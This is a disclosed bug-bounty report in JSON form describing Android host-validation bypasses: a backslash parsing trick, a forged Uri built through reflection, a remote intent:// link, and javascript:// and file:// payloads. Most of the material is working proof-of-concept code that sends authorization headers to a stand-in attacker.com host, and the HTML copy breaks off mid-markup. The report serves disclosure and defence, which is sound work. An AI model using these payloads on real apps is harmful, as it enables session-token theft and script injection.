{"id":431002,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MzEwMDI=","url":"https://hackerone.com/reports/431002","title":"Golden techniques to bypass host validations in Android apps","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2018-10-30T17:38:29.617Z","submitted_at":"2018-10-30T17:38:29.617Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bagipro","url":"/bagipro","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":31807,"url":"https://hackerone.com/redact","handle":"redact","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/031/807/3bf790585f65096b99a75d5fc8e1a8a9ad968da1_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/031/807/3bf790585f65096b99a75d5fc8e1a8a9ad968da1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"profile":{"name":"██████","twitter_handle":"","website":"","about":"██████ "}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":true,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-10-30T19:35:37.364Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":null,"comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Guys, there is an amazing Russian word \"zaheck\" which is a synonym to vulnerability, trick, vector or attack. You need to begin using it to make us happy!","vulnerability_information_html":"\u003cp\u003eGuys, there is an amazing Russian word \u0026quot;zaheck\u0026quot; which is a synonym to vulnerability, trick, vector or attack. You need to begin using it to make us happy!\u003c/p\u003e\n","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":231,"voters":["irek","8ayac","overjt","sebch","ikuamike","samengmg","kanytu","europa","bobrov","mshassy","and 221 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3556758,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-30T17:38:29.617Z","updated_at":"2018-10-30T17:38:29.617Z","actor":{"username":"bagipro","cleared":true,"url":"/bagipro","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bagipro","url":"/bagipro"},"genius_execution_id":null,"team_handle":"redact","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3556839,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-30T19:35:37.408Z","updated_at":"2018-10-30T19:35:37.408Z","actor":{"username":"bagipro","cleared":true,"url":"/bagipro","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"redact","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":11359,"category":"researcher","content":"# #1 Backslash tricks\nLook at a typical host validation\n```java\nUri uri = Uri.parse(attackerControlledString);\nif(\"legitimate.com\".equals(uri.getHost() || uri.getHost().endsWith(\".legitimate.com\")) {\n    webView.loadUrl(attackerControlledString, getAuthorizationHeaders()); // or webView.loadUrl(uri.toString())\n}\n```\n\nThere is a problem in ``` android.net.Uri ``` and ``` java.net.URL ``` parsers. They don't recognize backslashes in authority part (``` java.net.URI ``` will show an exception for that). If you test \n```java\nString url = \"http://attacker.com\\\\\\\\@legitimate.com/smth\";\nLog.d(\"Wow\", Uri.parse(url).getHost()); // legitimate.com is printed!\nwebView.loadUrl(url, getAuthorizationHeaders()); // attacker.com is loaded :P\n```\n\n# #2 Reflection\nHere is an example of a super-secure URL validation:\n```java\nUri uri = getIntent().getData();\nboolean isOurDomain = \"https\".equals(uri.getScheme()) \u0026\u0026 uri.getUserInfo() == null \u0026\u0026 \"legitimate.com\".equals(uri.getHost());\nif(isOurDomain) {\n    webView.load(uri.toString(), getAuthorizationHeaders());\n}\n```\n\n``` android.net.Uri ``` is widely used on the Android platform, but if you look at the source code, you will notice that there is an abstract class with a few internal subclasses! I found that custom URI with arbitrary parts could be built using ``` android.net.Uri$HierarchicalUri ```. Got the point already?\nCode in ``` MainActivity.java ```:\n```java\npublic class MainActivity extends Activity {\n\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n        Uri uri;\n        try {\n            Class partClass = Class.forName(\"android.net.Uri$Part\");\n            Constructor partConstructor = partClass.getDeclaredConstructors()[0];\n            partConstructor.setAccessible(true);\n\n            Class pathPartClass = Class.forName(\"android.net.Uri$PathPart\");\n            Constructor pathPartConstructor = pathPartClass.getDeclaredConstructors()[0];\n            pathPartConstructor.setAccessible(true);\n\n            Class hierarchicalUriClass = Class.forName(\"android.net.Uri$HierarchicalUri\");\n            Constructor hierarchicalUriConstructor = hierarchicalUriClass.getDeclaredConstructors()[0];\n            hierarchicalUriConstructor.setAccessible(true);\n\n            Object authority = partConstructor.newInstance(\"legitimate.com\", \"legitimate.com\");\n            Object path = pathPartConstructor.newInstance(\"@attacker.com\", \"@attacker.com\");\n            uri = (Uri) hierarchicalUriConstructor.newInstance(\"https\", authority, path, null, null);\n        }\n        catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n\n        Intent intent = new Intent();\n        intent.setData(uri);\n        intent.setClass(this, TestActivity.class);\n        startActivity(intent);\n    }\n}\n```\n\nCode in ``` TestActivity.java ```:\n```java\npublic class TestActivity extends Activity {\n\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n        Uri uri = getIntent().getData();\n        Log.d(\"Wow\", \"Scheme: \" + uri.getScheme());\n        Log.d(\"Wow\", \"UserInfo: \" + uri.getUserInfo());\n        Log.d(\"Wow\", \"Host: \" + uri.getHost());\n        Log.d(\"Wow\", \"toString(): \" + uri.toString());\n    }\n}\n```\n\nIn my case it displays:\n```\n10-30 06:02:20.142 32044 32044 D Wow     : Scheme: https\n10-30 06:02:20.142 32044 32044 D Wow     : UserInfo: null\n10-30 06:02:20.142 32044 32044 D Wow     : Host: legitimate.com\n10-30 06:02:20.142 32044 32044 D Wow     : toString(): https://legitimate.com@attacker.com\n```\n\nIt happens because apps parse URI only once, and a victim app doesn't parse it again, but trusts to \"already parsed\" URI received from untrusted sources\n\n# #3 Remote technique for #1\nAs you know, apps can automatically handle external links from browsers/messengers. This can be done by registering a special ``` intent-filter ```\n```xml\n\t\u003cactivity android:name=\".DeeplinkActivity\"\u003e\n\t    \u003cintent-filter android:autoVerify=\"true\"\u003e\n\t        \u003caction android:name=\"android.intent.action.VIEW\"/\u003e\n\t        \u003ccategory android:name=\"android.intent.category.DEFAULT\"/\u003e\n\t        \u003ccategory android:name=\"android.intent.category.BROWSABLE\"/\u003e\n\t        \u003cdata android:scheme=\"https\" android:host=\"legitimate.com\"/\u003e\n\t    \u003c/intent-filter\u003e\n\t\u003c/activity\u003e\n```\nAt this step you've already verified that you can attack that from third-party apps/ADB. If you try to create a remote PoC both to match the filter (remember that Android also uses ``` parsedIntent.getData().getHost() ``` to match with values defined in intent-filters) and triggers the bug\n```html\n\u003ca href=\"https://attacker.com\\\\@legitimate.com/\"\u003eBegin zaheck!\u003c/a\u003e\n```\nor\n\n```html\n\u003ca href=\"https://attacker.com%5C%5C@legitimate.com/\"\u003eBegin zaheck!\u003c/a\u003e\n```\nyou will notice that in the first example all ``` \\ ``` will be replaced with ``` / ```, in the second they will be kept encoded and the backslash trick won't work. But after careful research how ``` intent:// ``` scheme uries work I found a way to exploit it remotely. Intro: https://www.mbsd.jp/Whitepaper/IntentScheme.pdf\n\nAll backslashes could be saved in unchanged state in e.g. hash part of a URI right here https://android.googlesource.com/platform/frameworks/base/+/568faa8ed90d965faf302ca60677a40a5b84bf86/core/java/android/content/Intent.java#6334\n\nPoC:\n```html\n\u003ca href=\"intent://not_used/#Intent;scheme=https://attacker.com\\\\@legitimate.com/;end\"\u003eBegin zaheck!\u003c/a\u003e\n```\nHere https://android.googlesource.com/platform/frameworks/base/+/568faa8ed90d965faf302ca60677a40a5b84bf86/core/java/android/content/Intent.java#6436 it will be equal to\n```java\nUri.parse(\"https://attacker.com\\\\\\\\@legitimate.com/://not_used/\")\n```\nAnd the attack becomes remote!\n\n# #4 Missing scheme validation\nIn case if only the host value is validated, but the scheme isn't validated, you can use the following payloads with ``` javascript:// ``` and ``` file:// ``` scheme\n```\njavascript://legitimate.com/%0aalert(1)//\n```\nor\n```\nfile://legitimate.com/sdcard/payload.html\n```\n","can_view?":true,"can_edit?":false,"content_html":"\u003ch1 id=\"1-backslash-tricks\"\u003e#1 Backslash tricks\u003c/h1\u003e\n\n\u003cp\u003eLook at a typical host validation\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"nc\"\u003eUri\u003c/span\u003e \u003cspan class=\"n\"\u003euri\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eUri\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eparse\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eattackerControlledString\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;legitimate.com\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eequals\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetHost\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetHost\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003eendsWith\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;.legitimate.com\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ewebView\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eloadUrl\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eattackerControlledString\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003egetAuthorizationHeaders\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e \u003cspan class=\"c1\"\u003e// or webView.loadUrl(uri.toString())\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThere is a problem in \u003ccode\u003eandroid.net.Uri\u003c/code\u003e and \u003ccode\u003ejava.net.URL\u003c/code\u003e parsers. They don\u0026#39;t recognize backslashes in authority part (\u003ccode\u003ejava.net.URI\u003c/code\u003e will show an exception for that). If you test \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;http://attacker.com\\\\\\\\@legitimate.com/smth\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nc\"\u003eLog\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ed\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Wow\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eUri\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eparse\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"o\"\u003e).\u003c/span\u003e\u003cspan class=\"na\"\u003egetHost\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e \u003cspan class=\"c1\"\u003e// legitimate.com is printed!\u003c/span\u003e\n\u003cspan class=\"n\"\u003ewebView\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eloadUrl\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003egetAuthorizationHeaders\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e \u003cspan class=\"c1\"\u003e// attacker.com is loaded :P\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"2-reflection\"\u003e#2 Reflection\u003c/h1\u003e\n\n\u003cp\u003eHere is an example of a super-secure URL validation:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"nc\"\u003eUri\u003c/span\u003e \u003cspan class=\"n\"\u003euri\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetData\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n\u003cspan class=\"kt\"\u003eboolean\u003c/span\u003e \u003cspan class=\"n\"\u003eisOurDomain\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;https\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eequals\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetScheme\u003c/span\u003e\u003cspan class=\"o\"\u003e())\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetUserInfo\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;legitimate.com\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eequals\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetHost\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n\u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eisOurDomain\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ewebView\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eload\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003etoString\u003c/span\u003e\u003cspan class=\"o\"\u003e(),\u003c/span\u003e \u003cspan class=\"n\"\u003egetAuthorizationHeaders\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ccode\u003eandroid.net.Uri\u003c/code\u003e is widely used on the Android platform, but if you look at the source code, you will notice that there is an abstract class with a few internal subclasses! I found that custom URI with arbitrary parts could be built using \u003ccode\u003eandroid.net.Uri$HierarchicalUri\u003c/code\u003e. Got the point already?\u003cbr\u003e\nCode in \u003ccode\u003eMainActivity.java\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eMainActivity\u003c/span\u003e \u003cspan class=\"kd\"\u003eextends\u003c/span\u003e \u003cspan class=\"nc\"\u003eActivity\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\n    \u003cspan class=\"kd\"\u003eprotected\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eonCreate\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eBundle\u003c/span\u003e \u003cspan class=\"n\"\u003esavedInstanceState\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003esuper\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eonCreate\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esavedInstanceState\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\n        \u003cspan class=\"nc\"\u003eUri\u003c/span\u003e \u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003etry\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eClass\u003c/span\u003e \u003cspan class=\"n\"\u003epartClass\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eClass\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eforName\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.net.Uri$Part\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eConstructor\u003c/span\u003e \u003cspan class=\"n\"\u003epartConstructor\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003epartClass\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetDeclaredConstructors\u003c/span\u003e\u003cspan class=\"o\"\u003e()[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e];\u003c/span\u003e\n            \u003cspan class=\"n\"\u003epartConstructor\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetAccessible\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\n            \u003cspan class=\"nc\"\u003eClass\u003c/span\u003e \u003cspan class=\"n\"\u003epathPartClass\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eClass\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eforName\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.net.Uri$PathPart\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eConstructor\u003c/span\u003e \u003cspan class=\"n\"\u003epathPartConstructor\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003epathPartClass\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetDeclaredConstructors\u003c/span\u003e\u003cspan class=\"o\"\u003e()[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e];\u003c/span\u003e\n            \u003cspan class=\"n\"\u003epathPartConstructor\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetAccessible\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\n            \u003cspan class=\"nc\"\u003eClass\u003c/span\u003e \u003cspan class=\"n\"\u003ehierarchicalUriClass\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eClass\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eforName\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.net.Uri$HierarchicalUri\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eConstructor\u003c/span\u003e \u003cspan class=\"n\"\u003ehierarchicalUriConstructor\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ehierarchicalUriClass\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetDeclaredConstructors\u003c/span\u003e\u003cspan class=\"o\"\u003e()[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e];\u003c/span\u003e\n            \u003cspan class=\"n\"\u003ehierarchicalUriConstructor\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetAccessible\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\n            \u003cspan class=\"nc\"\u003eObject\u003c/span\u003e \u003cspan class=\"n\"\u003eauthority\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003epartConstructor\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003enewInstance\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;legitimate.com\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;legitimate.com\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eObject\u003c/span\u003e \u003cspan class=\"n\"\u003epath\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003epathPartConstructor\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003enewInstance\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;@attacker.com\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;@attacker.com\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"n\"\u003euri\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eUri\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"n\"\u003ehierarchicalUriConstructor\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003enewInstance\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eauthority\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003epath\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ecatch\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"n\"\u003ee\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"k\"\u003ethrow\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nf\"\u003eRuntimeException\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ee\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\n        \u003cspan class=\"nc\"\u003eIntent\u003c/span\u003e \u003cspan class=\"n\"\u003eintent\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eintent\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetData\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eintent\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetClass\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eTestActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003estartActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eintent\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCode in \u003ccode\u003eTestActivity.java\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan 